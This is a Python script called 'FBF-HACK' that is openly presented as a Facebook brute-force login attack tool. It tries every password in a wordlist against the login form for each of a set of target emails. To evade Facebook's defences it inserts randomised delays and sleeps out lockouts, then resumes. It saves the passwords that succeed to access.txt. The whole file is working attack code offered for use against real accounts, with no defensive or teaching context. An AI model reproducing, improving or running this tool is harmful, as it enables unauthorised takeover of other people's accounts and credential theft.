#!/usr/bin/python3
#Created by : Mahmoud khalid
#FB profil : https://www.facebook.com/mahmoud.banzema.1
#Running on python3
#Use help command for display help menu
#For execute script use this command in terminal 'python3 FBF-HACK.py' not './FBF-HACK.py'
#can execute on linux and windows machine

from sys import version
pyversion = version
if int(pyversion.split('.')[0]) != 3:
	print("[-] Failed, You have python verison {}, FBF-HACK running on python3 or more".format(pyversion[:3]))
	exit()
try:
	from platform import system
	from time import sleep,ctime
	from random import randrange
	import mechanicalsoup
except:
	print("[-] Failed mechanicalsoup not installed")
	OS = system()
	if OS == 'Windows':
			print("[+] Must install mechanicalsoup library for Windows OS")
			print(" -  Open CMD and use this command 'C:\Python{}\Script\pip.exe install mechanicalsoup'".format(pyversion[:3]))
			exit()
	elif OS == 'Linux':
			print("[+] Must install mechanicalsoup library for Linux OS")
			print(" -  Open terminal and use this command 'apt install python3-mechanicalsoup'")
			exit()
	else:
			print("[-] Try searching mechanicalsoup installation for your OS")
			exit()
			

userslist = ['USER',' ']
passwordtxt = ['PASSWORDFILE','passwords.txt']
timernextup = ['TIMERNEXTUP',30]
blockedtimer = ['BLOCKEDTIMER',17]

def banner():
	print("""
           _______  ____  __ _____  _______ __
          / __/ _ )/ __/ / // / _ |/ ___/ //_/
         / _// _  / _/  / _  / __ / /__/ ,<   
        /_/ /____/_/   /_//_/_/ |_\___/_/|_|  
									  
                --- [ FBF HACK ] ---
          --( Facebook Brute Force HACK )--
             Created By : Mahmoud Khalid
          FB Profile : FB/mahmoud.banzema.1
""")

def helpmenu():
	print("------------------------------------------------------")
	print("{:<25}{}".format('COMMANDS','DESCRIPTION'))
	print("------------------------------------------------------")
	print("{:<25}{}".format('SET',"Edit any option, for display it use 'OPTIONS' command"))
	print("{:<25}{}".format('OPTIONS',"Display use options"))
	print("{:<25}{}".format('RUN',"Running tool"))
	print("{:<25}{}".format('HELP',"Display helper menu"))
	
def options():
	print("---------------------------------------------------------------------------------")
	print("{:<25}{:<25}{:<10}{}".format('NAME','SETTING','REQUIRED','DESCRIPTION'))
	print("---------------------------------------------------------------------------------")
	print("{:<25}{:<25}{:<10}{}".format(userslist[0],userslist[1],'YES',"Set the users list split it by ',' or write single user"))
	print("{:<25}{:<25}{:<10}{}".format(passwordtxt[0],passwordtxt[1],'YES',"Select the path passwords.txt file"))
	print("{:<25}{:<25}{:<10}{}".format(timernextup[0],timernextup[1],'NO',"Number of seconds to new retry + 30 random sec (Default : 30 sec)"))
	print("{:<25}{:<25}{:<10}{}".format(blockedtimer[0],blockedtimer[1],'NO',"Number of minutes for sleeping in case of blocked (Default : 17 min)\n"))
	print("------------------------------------------------------")
	print("{:<9}: 'YES' Required can't be change to DISABLE".format('[!] NOTE '))
	print("{:<9}: 'NO' Required can be change to DISABLE EX: 'SET TIMERNEXTUP DISABLE'".format(' '))
	print("{:<9}:  Recommended don't disable any option so as not to be block account".format(' '))
	
def set(name,setting):
	if name.upper() == userslist[0]:
		if setting.lower() != 'disable':
			userslist[1] = setting
			print("SET {} ==> {}".format(userslist[0],userslist[1]))
	elif name.upper() == passwordtxt[0]:
		if setting.lower() != 'disable':
			passwordtxt[1] = setting
			print("SET {} ==> {}".format(passwordtxt[0],passwordtxt[1]))
	elif name.upper() == timernextup[0]:
		if setting.lower() == 'disable' or str(setting).isdigit() == True:
			timernextup[1] = setting
			print("SET {} ==> {}".format(timernextup[0],timernextup[1]))
	elif name.upper() == blockedtimer[0]:
		if setting.lower() == 'disable' or str(setting).isdigit() == True:
			blockedtimer[1] = setting
			print("SET {} ==> {}".format(blockedtimer[0],blockedtimer[1]))
	else:
		print("[-] This command is not found !")
		
def run(emails,passlist,timernextupfun,blockedtimerfun):
	emailsplit = emails.split(',')
	try:
		op = open(passlist,"r")
		passwordslist = op.readlines()
		lenghtpassowrdslist = len(passwordslist)
	except:
		print("[-] Failed read {} file is not found".format(passlist))
	try:
		print("[+] Successfully readed passwords.txt file")
		browser = mechanicalsoup.Browser()
		login_page = browser.get("https://en-gb.facebook.com/login.php?login_attempt=1&lwv=100")
		login_form = login_page.soup.select("#login_form")[0]
		print("[+] Successfully facebook connection")
		for email in emailsplit:
			trying = 1
			print("\n[+] Started FBF-HACK attack on " + email)
			for i in passwordslist:
				if i in ['',' ']:
					continue;
				signupcounter = 0
				ErrorResponse = 0
				dispayonlyone = 0
				i = i.rstrip("\n")
				login_form.select("#email")[0]['value'] = email
				login_form.select("#pass")[0]['value'] = i
				page2 = browser.submit(login_form, login_page.url)
				print("[+] {}/{} - Trying password : {}".format(trying,lenghtpassowrdslist,i))
				for onetext in page2.soup.findAll("div"):
					gettext = onetext.text
					#print(gettext)						#Debuger
					if "Please try again later" in gettext:
						if dispayonlyone == 0:
							dispayonlyone = 1
							print("#---------------- Warnning {} ----------------#".format(ctime()))
							print("# [!] Your bruteforce attack is Blocked !                           #")
							if blockedtimerfun.isdigit() == True:
								print("# [+] sleeping {} minutes and then continue again...                #".format(blockedtimerfun))
								print("#####################################################################")
								sleep(int(blockedtimerfun)*60)
							else:
								print("#####################################################################")
					elif "Sign Up" in gettext:
						signupcounter += 1
					elif "We're working on getting this fixed as soon as we can" in gettext:
						ErrorResponse = 1
				dispayonlyone = 0	
				#print(signupcounter)						#Debuger	
				if signupcounter not in [11,9] and ErrorResponse == 0:
					print("[+] Success login account {}, password = {}".format(email,i))
					saving = open('access.txt','a')
					saving.write("[+] Success login account {}, password = {}\n".format(email,i))
					print("[+] Finished bruteforce attack at {} saving to access.txt".format(ctime()))
					break;
				else:
					print("[-] Failed login account")
				trying += 1
				if timernextupfun.isdigit() == True: 
					randomtime = randrange(int(timernextupfun),int(timernextupfun)+30)
					print("[+] Next up trying after {} seconds".format(str(randomtime)))
					sleep(int(randomtime))
	except:
		pass;

#main script here
banner()
print("[+] Use help for help menu")
while True:
	try:
		shell = input("\nFBF-HACK@Shell~$:  ").split(' ')
	except:
		print("\n[!] See you later, Bye..")
		break;
	if shell[0].lower() in ['set','help','options','run','exit']:
		if shell[0].lower() == "set" and len(shell) == 3:
			set(shell[1],shell[2])
		elif shell[0].lower() == "help":
			helpmenu()
		elif shell[0].lower() == "options":
			options()
		elif shell[0].lower() == "exit":
			print("[!] See you later, Bye..")
			exit()
		elif shell[0].lower() == "run":
			if userslist[1] != ' ':
				run(str(userslist[1]),str(passwordtxt[1]),str(timernextup[1]),str(blockedtimer[1]))
			else:
				print("[-] USER haven't information")
		else:
			print("[-] This command is not found !")
	else:
		if shell[0] == '':
			continue;
		else:
			print("[-] This command is not found !")
